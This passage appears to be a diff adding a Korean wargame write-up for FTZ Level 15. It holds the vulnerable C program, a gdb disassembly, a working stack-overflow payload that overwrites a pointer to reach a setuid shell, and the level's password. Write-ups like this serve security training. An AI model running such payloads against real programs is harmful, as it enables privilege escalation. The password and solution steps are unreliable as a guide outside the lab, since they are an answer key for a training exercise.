@@ -395,3 +395,70 @@ bof를 하려면 40바이트를 채워주고 deadbeef를 리틀엔디언 형식으로 넣어주면 자동으�
 
 
 답 == guess what
+
+
+
+
+#================================================================================#
+#FTZ Level 15
+hint)
+#include <stdio.h>
+ 
+main()
+{ int crap;
+  int *check;
+  char buf[20];
+  fgets(buf,45,stdin);
+  if (*check==0xdeadbeef)
+   {
+     setreuid(3096,3096);
+     system("/bin/sh");
+   }
+}  
+
+#FTZ Level 15 풀이 과정)
+이번에는 check가 포인터로 변했다.
+전과 같은 방식으로 도전하면 세그먼트 오류가 뜬다.
+
+Dump of assembler code for function main:
+0x08048490 <main+0>:	push   ebp
+0x08048491 <main+1>:	mov    ebp,esp
+0x08048493 <main+3>:	sub    esp,0x38
+0x08048496 <main+6>:	sub    esp,0x4
+0x08048499 <main+9>:	push   ds:0x8049664
+0x0804849f <main+15>:	push   0x2d
+0x080484a1 <main+17>:	lea    eax,[ebp-56]
+0x080484a4 <main+20>:	push   eax
+0x080484a5 <main+21>:	call   0x8048360 <fgets>
+0x080484aa <main+26>:	add    esp,0x10
+0x080484ad <main+29>:	mov    eax,DWORD PTR [ebp-16]
+0x080484b0 <main+32>:	cmp    DWORD PTR [eax],0xdeadbeef 
+0x080484b6 <main+38>:	jne    0x80484dd <main+77>
+0x080484b8 <main+40>:	sub    esp,0x8
+0x080484bb <main+43>:	push   0xc18
+0x080484c0 <main+48>:	push   0xc18
+0x080484c5 <main+53>:	call   0x8048380 <setreuid>
+0x080484ca <main+58>:	add    esp,0x10
+0x080484cd <main+61>:	sub    esp,0xc
+0x080484d0 <main+64>:	push   0x8048548
+0x080484d5 <main+69>:	call   0x8048340 <system>
+0x080484da <main+74>:	add    esp,0x10
+0x080484dd <main+77>:	leave  
+0x080484de <main+78>:	ret    
+0x080484df <main+79>:	nop    
+End of assembler dump.
+
+어셈블리어를 까보면, 여전히 40바이트 차이가 나는데, ebp-16의 포인터를 EAX에 복사해서 EAX의 포인터로 0xdeadbeef를 비교한다.
+즉 EAX에 들어갈 주소가 0xdeadbeef의 주소가 된다면, 결국 같은 값이니 if문을 충분히 수행할 수 있다.
+
+gdb 에서 x/[임의정수]x [주소] 하면 임의 정수 크기만큼 값을 볼 수 있는데.
+gdb x/5/x 0x080484b2 를 하니 deadbeef가 보였다. 저것을 리틀엔디언 방식으로 페이로드에 넣어주면 되겠다. 
+
+
+(python -c 'print"A"*40 + "\xb2\x84\x04\x08"'; cat)  | /home/level15/attackme
+
+요상하게 쉘이 실행되고 my-pass하면 얻어올 수 있다.
+포맷스트링을 사용 안하고 있다...?
+
+
+답 == about to cause mass
